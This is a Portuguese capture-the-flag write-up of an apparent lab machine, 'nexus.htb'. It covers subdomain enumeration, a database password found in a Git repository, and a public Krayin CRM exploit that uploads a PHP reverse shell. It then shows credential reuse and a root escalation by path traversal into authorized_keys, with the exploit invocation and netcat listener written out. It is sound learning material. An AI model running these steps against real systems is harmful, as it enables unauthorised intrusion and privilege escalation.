#ctfs 

Primeiro comecei com um scan `nmap`em todas as portas

```shell
$ nmap 10.129.234.54 --open -p- -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 21:19 -03
Nmap scan report for 10.129.234.54
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 47.07 seconds
```

Temos um site no ar. Ao tentar abrir a página no navegador encontramos um domínio a ser declarado na tabela de roteamento estático do computador, basta editar no `/etc/hosts`
e o site aparece.

![Pagina principal do site nexus.htb no navegador](Imagens/Pasted%20image%2020260804212349.png)

Após uma rápida exploração da página principal encontramos o endereço de email associado a um dos staffers do site. O que nos traz a segunda flag.

Podemos iniciar agora uma varredura de diretórios.

```shell
$ feroxbuster -u http://nexus.htb/ -w /usr/share/wordlists/dirb/big.txt -x txt,json,env,config,php -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nexus.htb/
 🚩  In-Scope Url          │ nexus.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, json, env, config, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1267l     3775w    49296c http://nexus.htb/
[####################] - 8m   122814/122814  0s      found:1       errors:2
[####################] - 8m   122814/122814  252/s   http://nexus.htb/
```

Observe que não nos retornou nada, vamos inicair uma varredura de subdomínios associados a tal host.

```shell
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
       -u "http://10.129.234.54" \
       -H "Host: FUZZ.nexus.htb" \
       -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.54
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.nexus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

billing                [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 407ms]
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 152ms]
:: Progress: [19966/19966] :: Job [1/1] :: 170 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
```

Agora tivemos o retorno de dois subdomínios (`billing.nexus.htb`e `git.nexus.htb`). Após configurar a tabela de roteamento conseguimos acessar os dois sites.

![Subdominio billing.nexus.htb acessado](Imagens/Pasted%20image%2020260804213635.png)
![Subdominio git.nexus.htb acessado](Imagens/Pasted%20image%2020260804213654.png)

Vamos explorar o `git.nexus.htb` a fim de seguir o roteiro do CTF.

Após uma breve procura pelos repositórios abertos encontrei a seguinte credencial de banco de dados:

![Credencial de banco de dados encontrada em repositorio Git](Imagens/Pasted%20image%2020260805161312.png)

Conseguimos a senha do banco de dados. Após voltar ao `billing.nexus.htb` e tentar logar com as credenciais encontradas conseguimos acesso a um dashboard

![Dashboard do billing apos login com as credenciais](Imagens/Pasted%20image%2020260909215131.png)

Com isso, ao procurar rapidamente pelo site encontramos sua versão.

Após procurar uma vulnerabilidade que afete o `Krayin 2.2.0` encontramos o [CVE-2026-38526](https://www.exploit-db.com/exploits/52629)

Após baixar a prova de conceito e executar o payload usando um código php malicioso para shell reversa conseguimos acesso

```shell
python3 exploit.py -t http://billing.nexus.htb/admin/login -u 'j.matthew@nexus.htb' -p '[senha db]' -f rev.php
[+] File uploaded successfully.
Path to file: http://billing.nexus.htb/storage/tinymce/b148f1b47b4363cde604343930e65aec.php
```

Dando o acesso

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.151] from (UNKNOWN) [meu IP] 51660
Linux nexus 6.8.0-111-generic #111-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 11 23:16:02 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 00:57:05 up 23 min,  0 user,  load average: 0.21, 1.81, 1.51
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Ao começar a pós-exploração encontramos um arquivo com configurações do Krayin

```shell
$ cat .env
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=[senha krayin]
DB_PREFIX=
```

Podemos testar o reuso dessa senha para os usuários do host. Testando para `jones`

```shell
$ su jones
Password: [senha jones]
whoami
jones
cd /home/jones
ls
user.txt
cat user.txt
[flag user.txt]
```

Conseguimos a flag de user, precisamos escalar privilégios. Vamos dar uma olhada nos temporizadores de `systemd`para ver se temos alguma tarefa agendada.

```shell
jones@nexus:~$ systemctl list-timers --all --no-pager --full
systemctl list-timers --all --no-pager --full
NEXT                            LEFT LAST                           PASSED UNIT                           ACTIVATES                       
Thu 2026-09-10 01:09:29 UTC       4s Thu 2026-09-10 01:08:29 UTC   55s ago gitea-template-sync.timer      gitea-template-sync.service
Thu 2026-09-10 01:10:00 UTC      34s Thu 2026-09-10 01:00:01 UTC  9min ago sysstat-collect.timer          sysstat-collect.service
Thu 2026-09-10 01:13:24 UTC 3min 58s Mon 2026-05-11 16:31:53 UTC         - fwupd-refresh.timer            fwupd-refresh.service
Thu 2026-09-10 01:16:50 UTC     7min Tue 2026-05-12 11:48:03 UTC         - fstrim.timer                   fstrim.service
Thu 2026-09-10 01:31:10 UTC    21min Tue 2026-05-12 11:52:41 UTC         - motd-news.timer                motd-news.service
Thu 2026-09-10 01:39:00 UTC    29min Thu 2026-09-10 01:09:04 UTC   21s ago phpsessionclean.timer          phpsessionclean.service
Thu 2026-09-10 03:11:20 UTC  2h 1min Mon 2025-03-31 16:38:00 UTC         - apt-daily.timer                apt-daily.service
Thu 2026-09-10 04:51:23 UTC 3h 41min Thu 2026-04-23 18:33:27 UTC         - man-db.timer                   man-db.service
Thu 2026-09-10 06:30:54 UTC 5h 21min Thu 2026-09-10 00:54:44 UTC 14min ago apt-daily-upgrade.timer        apt-daily-upgrade.service
Fri 2026-09-11 00:00:00 UTC      22h Thu 2026-09-10 00:34:11 UTC 35min ago dpkg-db-backup.timer           dpkg-db-backup.service
Fri 2026-09-11 00:00:00 UTC      22h Thu 2026-09-10 00:34:11 UTC 35min ago logrotate.timer                logrotate.service
Fri 2026-09-11 00:07:00 UTC      22h -                                   - sysstat-summary.timer          sysstat-summary.service
Fri 2026-09-11 00:39:09 UTC      23h Thu 2026-09-10 00:39:09 UTC 30min ago update-notifier-download.timer update-notifier-download.service
Fri 2026-09-11 00:49:05 UTC      23h Thu 2026-09-10 00:49:05 UTC 20min ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sun 2026-09-13 03:10:30 UTC   3 days Thu 2026-09-10 00:34:29 UTC 34min ago e2scrub_all.timer              e2scrub_all.service
Wed 2026-09-16 13:34:33 UTC   6 days Mon 2026-03-23 10:50:29 UTC         - update-notifier-motd.timer     update-notifier-motd.service
-                                  - -                                   - apport-autoreport.timer        apport-autoreport.service
-                                  - -                                   - snapd.snap-repair.timer        snapd.snap-repair.service
-                                  - -                                   - ua-timer.timer                 ua-timer.service

19 timers listed.
```

Observe o `gitea-template-sync.service`. Vamos investigar.

```shell
systemctl cat gitea-template-sync.service
# /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

- Meu terminal quebrou com as provas, mas eu resumi a explicação:

O timer está executando `/etc/gitea/template-sync.py` como root esse script que busca repositórios do Gitea marcados como  **template**

Como para cada arquivo do repositório o destino era construído através do `target = os.path.join(stage_path, filepath)`, como o "filepath" vinha da árvore Git sem validação contra ../, podemos criar uma árvore que faça `../../../../../root/.ssh/authorized_keys`

Com isso, nessa nova chave colocamos nossa chave SSH pública e foi feito um commit para um repositório criado no site que foi marcado como template. Quando o script executou novamente como tarefa agendada ele gravou a chave na pasta do root. 

Por fim, apenas acessei o SSH de modo a passar um comando, que nesse caso era de leitura de flag. `ssh -i /tmp/nexus_root root@localhost 'cat /root/root.txt'`
